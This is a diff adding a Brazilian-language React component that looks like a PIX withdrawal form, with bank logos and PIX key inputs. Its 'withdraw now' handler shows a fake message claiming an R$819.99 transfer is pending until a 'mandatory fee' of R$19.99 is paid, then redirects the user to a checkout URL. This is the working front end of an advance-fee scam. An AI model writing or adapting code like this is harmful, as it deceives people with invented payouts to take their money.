@@ -1,0 +1,210 @@
+'use client'
+
+import Pix from '@/assets/icon-pix.png'
+import BB from '@/assets/bb.png'
+import Caixa from '@/assets/caixa.png'
+import Inter from '@/assets/inter.png'
+import Itau from '@/assets/itau.png'
+import Nu from '@/assets/nubank.png'
+import C6 from '@/assets/picpay.png'
+import Outro from '@/assets/outro.png'
+import Bradesco from '@/assets/bradesco.png'
+
+import Image from "next/image"
+import { useEffect, useState } from "react"
+import { toast } from 'sonner'
+import { InputMask } from '@react-input/mask';
+import { CHECKOUT_URL } from '@/functions/urls'
+
+export function FormPayment() {
+
+  const [typeInput, setTypeInput] = useState<React.HTMLInputTypeAttribute | "">("")
+  const [bank, setBank] = useState<"bb" | "c6" | "nu" | "itau" | "inter" | "caixa" | "outro" | "bradesco" | null>(null)
+  const [pixKey, setPixKey] = useState<string>("")
+  const [seconds, setSeconds] = useState<number>(3)
+
+  const [btn, setBtn] = useState<string>()
+
+
+
+  function handleBtn(type: string) {
+
+    setPixKey("")
+
+    if (type === 'tel') {
+      setTypeInput("tel")
+      setBtn('tel')
+    }
+
+    if (type === 'cpf') {
+      setTypeInput("tel")
+      setBtn('cpf')
+    }
+
+    if (type === 'email') {
+      setTypeInput("email")
+      setBtn('email')
+    }
+
+    if (type === 'chave') {
+      setTypeInput("text")
+      setBtn('chave')
+    }
+  }
+
+  function handleSaque() {
+    if (bank === null) {
+      toast.info("Selecione um banco para continuar.", { duration: 1500 });
+      return;
+    }
+
+    if (typeInput === "") {
+      toast.info("Selecione o tipo de chave pix.", { duration: 1500 });
+      return;
+    }
+
+    if (pixKey.length < 3) {
+      toast.info("Informe sua chave PIX", { duration: 1500 });
+      return;
+    }
+
+
+    toast(
+      <div className='flex items-center gap-3'>
+        <Image src={Pix} alt="bank" className='w-[40px] h-auto object-cover' width={0} height={0} priority />
+        <div className='space-y-0'>
+          <span className='font-semibold text-sm text-black'>Transferência PIX pendente!</span>
+          <p className='text-black tracking-wide leading-4'>Transferência de <span className='font-bold'>
+
+            {
+              new Intl.NumberFormat('pt-BR', {
+                style: 'currency',
+                currency: 'BRL',
+              }).format(Number(819.99))
+            }
+
+          </span> quase concluida, aguardando pagamento da taxa obrigatoria de <strong>R$ 19,99</strong>.</p>
+        </div>
+      </div>,
+      {
+        className: 'bg-white p-2 rounded-xl',
+      }
+    );
+
+
+    const countdown = setInterval(() => {
+      setSeconds(prevSeconds => prevSeconds - 1);
+    }, 1000);
+
+
+    setTimeout(() => {
+      clearInterval(countdown);
+      window.location.href = CHECKOUT_URL;
+    }, seconds * 1000);
+
+
+  }
+
+  useEffect(() => {
+    if (seconds === 0) {
+      window.location.href = CHECKOUT_URL;
+    }
+  }, [seconds]);
+
+
+
+
+  return (
+    <div className='space-y-10 mt-10'>
+      <div className='grid grid-cols-4 gap-6 place-items-center'>
+        <button className='relative' onClick={() => setBank("bb")}>
+          {bank === 'bb' && (<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="#25d366" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" className="size-6  absolute -top-2 -right-2 lucide lucide-check"><path d="M3.85 8.62a4 4 0 0 1 4.78-4.77 4 4 0 0 1 6.74 0 4 4 0 0 1 4.78 4.78 4 4 0 0 1 0 6.74 4 4 0 0 1-4.77 4.78 4 4 0 0 1-6.75 0 4 4 0 0 1-4.78-4.77 4 4 0 0 1 0-6.76Z" stroke="#25d366" /><path d="m9 12 2 2 4-4" /></svg>)}
+          <Image src={BB} alt='logo' className='w-[50px] h-auto object-cover' width={0} height={0} priority />
+        </button>
+        <button className='relative' onClick={() => setBank("caixa")}>
+          {bank === 'caixa' && (<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="#25d366" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" className="size-6  absolute -top-2 -right-2 lucide lucide-check"><path d="M3.85 8.62a4 4 0 0 1 4.78-4.77 4 4 0 0 1 6.74 0 4 4 0 0 1 4.78 4.78 4 4 0 0 1 0 6.74 4 4 0 0 1-4.77 4.78 4 4 0 0 1-6.75 0 4 4 0 0 1-4.78-4.77 4 4 0 0 1 0-6.76Z" stroke="#25d366" /><path d="m9 12 2 2 4-4" /></svg>)}
+          <Image src={Caixa} alt='logo' className='w-[50px] h-auto object-cover' width={0} height={0} priority />
+        </button>
+        <button className='relative' onClick={() => setBank("nu")}>
+          {bank === 'nu' && (<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="#25d366" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" className="size-6  absolute -top-2 -right-2 lucide lucide-check"><path d="M3.85 8.62a4 4 0 0 1 4.78-4.77 4 4 0 0 1 6.74 0 4 4 0 0 1 4.78 4.78 4 4 0 0 1 0 6.74 4 4 0 0 1-4.77 4.78 4 4 0 0 1-6.75 0 4 4 0 0 1-4.78-4.77 4 4 0 0 1 0-6.76Z" stroke="#25d366" /><path d="m9 12 2 2 4-4" /></svg>)}
+          <Image src={Nu} alt='logo' className='w-[50px] h-auto object-cover' width={0} height={0} priority />
+        </button>
+        <button className='relative' onClick={() => setBank("itau")}>
+          {bank === 'itau' && (<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="#25d366" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" className="size-6  absolute -top-2 -right-2 lucide lucide-check"><path d="M3.85 8.62a4 4 0 0 1 4.78-4.77 4 4 0 0 1 6.74 0 4 4 0 0 1 4.78 4.78 4 4 0 0 1 0 6.74 4 4 0 0 1-4.77 4.78 4 4 0 0 1-6.75 0 4 4 0 0 1-4.78-4.77 4 4 0 0 1 0-6.76Z" stroke="#25d366" /><path d="m9 12 2 2 4-4" /></svg>)}
+          <Image src={Itau} alt='logo' className='w-[50px] h-auto object-cover' width={0} height={0} priority />
+        </button>
+        <button className='relative' onClick={() => setBank("inter")}>
+          {bank === 'inter' && (<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="#25d366" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" className="size-6  absolute -top-2 -right-2 lucide lucide-check"><path d="M3.85 8.62a4 4 0 0 1 4.78-4.77 4 4 0 0 1 6.74 0 4 4 0 0 1 4.78 4.78 4 4 0 0 1 0 6.74 4 4 0 0 1-4.77 4.78 4 4 0 0 1-6.75 0 4 4 0 0 1-4.78-4.77 4 4 0 0 1 0-6.76Z" stroke="#25d366" /><path d="m9 12 2 2 4-4" /></svg>)}
+          <Image src={Inter} alt='logo' className='w-[50px] h-auto object-cover' width={0} height={0} priority />
+        </button>
+        <button className='relative' onClick={() => setBank("c6")}>
+          {bank === 'c6' && (<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="#25d366" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" className="size-6  absolute -top-2 -right-2 lucide lucide-check"><path d="M3.85 8.62a4 4 0 0 1 4.78-4.77 4 4 0 0 1 6.74 0 4 4 0 0 1 4.78 4.78 4 4 0 0 1 0 6.74 4 4 0 0 1-4.77 4.78 4 4 0 0 1-6.75 0 4 4 0 0 1-4.78-4.77 4 4 0 0 1 0-6.76Z" stroke="#25d366" /><path d="m9 12 2 2 4-4" /></svg>)}
+          <Image src={C6} alt='logo' className='w-[50px] h-auto object-cover' width={0} height={0} priority />
+        </button>
+        <button className='relative' onClick={() => setBank("bradesco")}>
+          {bank === 'bradesco' && (<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="#25d366" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" className="size-6  absolute -top-2 -right-2 lucide lucide-check"><path d="M3.85 8.62a4 4 0 0 1 4.78-4.77 4 4 0 0 1 6.74 0 4 4 0 0 1 4.78 4.78 4 4 0 0 1 0 6.74 4 4 0 0 1-4.77 4.78 4 4 0 0 1-6.75 0 4 4 0 0 1-4.78-4.77 4 4 0 0 1 0-6.76Z" stroke="#25d366" /><path d="m9 12 2 2 4-4" /></svg>)}
+          <Image src={Bradesco} alt='logo' className='w-[50px] h-auto object-cover' width={0} height={0} />
+        </button>
+        <button className='relative' onClick={() => setBank("outro")}>
+          {bank === 'outro' && (<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="#25d366" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" className="size-6  absolute -top-2 -right-2 lucide lucide-check"><path d="M3.85 8.62a4 4 0 0 1 4.78-4.77 4 4 0 0 1 6.74 0 4 4 0 0 1 4.78 4.78 4 4 0 0 1 0 6.74 4 4 0 0 1-4.77 4.78 4 4 0 0 1-6.75 0 4 4 0 0 1-4.78-4.77 4 4 0 0 1 0-6.76Z" stroke="#25d366" /><path d="m9 12 2 2 4-4" /></svg>)}
+          <Image src={Outro} alt='logo' className='w-[50px] h-auto object-cover' width={0} height={0} priority />
+        </button>
+      </div>
+
+
+
+
+      <div className='flex items-center justify-center gap-2 mt-6'>
+        <Image src={Pix} alt="icon pix" className='w-[15px] h-auto object-cover' priority />
+        <p className='text-xs font-semibold text-zinc-900'>Selecione sua chave PIX</p>
+      </div>
+
+      <div className='grid grid-cols-4 gap-2 mt-4'>
+        <button onClick={() => handleBtn('tel')} className={btn === 'tel' ? 'flex flex-col items-center justify-center bg-white ring-2 ring-[#00bdae] rounded-md p-1 gap-4' : 'flex flex-col items-center justify-center bg-white rounded-md p-1 gap-4'}>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="size-5 lucide lucide-smartphone text-zinc-900"><rect width="14" height="20" x="5" y="2" rx="2" ry="2" /><path d="M12 18h.01" /></svg>
+          <span className='text-zinc-900 font-bold text-sm'>Celular</span>
+        </button>
+        <button onClick={() => handleBtn("cpf")} className={btn === 'cpf' ? 'flex flex-col items-center justify-center bg-white ring-2 ring-[#00bdae] rounded-md p-1 gap-4' : 'flex flex-col items-center justify-center bg-white  rounded-md p-1 gap-4'}>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="size-5 lucide lucide-smartphone text-zinc-900"><path d="M15 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7Z" /><path d="M14 2v4a2 2 0 0 0 2 2h4" /></svg>
+          <span className='text-zinc-900 font-bold text-sm'>CPF</span>
+        </button>
+        <button onClick={() => handleBtn("email")} className={btn === 'email' ? 'flex flex-col items-center justify-center bg-white ring-2 ring-[#00bdae] rounded-md p-1 gap-4' : 'flex flex-col items-center justify-center bg-white  rounded-md p-1 gap-4'}>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="size-5 lucide lucide-smartphone text-zinc-900"><rect width="20" height="16" x="2" y="4" rx="2" /><path d="m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7" /></svg>
+          <span className='text-zinc-900 font-bold text-sm'>E-mail</span>
+        </button>
+        <button onClick={() => handleBtn("chave")} className={btn === 'chave' ? 'flex flex-col items-center justify-center bg-white ring-2 ring-[#00bdae] rounded-md p-1 gap-4' : 'flex flex-col items-center justify-center bg-white  rounded-md p-1 pt-2  gap-2'}>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="size-5 lucide lucide-smartphone text-zinc-900"><path d="M2 18v3c0 .6.4 1 1 1h4v-3h3v-3h2l1.4-1.4a6.5 6.5 0 1 0-4-4Z" /><circle cx="16.5" cy="7.5" r=".5" fill="currentColor" /></svg>
+          <span className='text-zinc-900 font-bold text-sm'>Chave aleatoria</span>
+        </button>
+      </div>
+      <div className='space-y-4'>
+
+
+        {btn === "tel" && (
+          <InputMask type={typeInput} value={pixKey} onChange={(e) => setPixKey(e.target.value)} mask="(__) _____-____" replacement={{ _: /\d/ }} className='p-2 rounded-lg ring-1 ring-[#005952] focus:ring-2 outline-none border-0 w-full text-sm h-10' placeholder='Digite sua chave PIX aqui....' />
+        )}
+
+
+        {btn === "cpf" && (
+          <InputMask type={typeInput} value={pixKey} onChange={(e) => setPixKey(e.target.value)} mask="___.___.___-__" replacement={{ _: /\d/ }} className='p-2 rounded-lg ring-1 ring-[#005952] focus:ring-2 outline-none border-0 w-full text-sm h-10' placeholder='Digite sua chave PIX aqui....' />
+        )}
+
+        {btn === "email" && (
+          <input type={typeInput} value={pixKey} onChange={(e) => setPixKey(e.target.value)} className='p-2 rounded-lg ring-1 ring-[#005952] focus:ring-2 outline-none border-0 w-full text-sm h-10' placeholder='Digite sua chave PIX aqui....' />
+        )}
+
+        {btn === "chave" && (
+          <input type={typeInput} value={pixKey} onChange={(e) => setPixKey(e.target.value)} className='p-2 rounded-lg ring-1 ring-[#005952] focus:ring-2 outline-none border-0 w-full text-sm h-10' placeholder='Digite sua chave PIX aqui....' />
+        )}
+
+
+
+        <button onClick={handleSaque} className='w-full bg-[#005952] h-12 flex items-center justify-center text-white font-semibold  rounded-lg'>
+          <span>Realizar saque agora</span>
+        </button>
+      </div>
+    </div>
+
+  )
+
+}
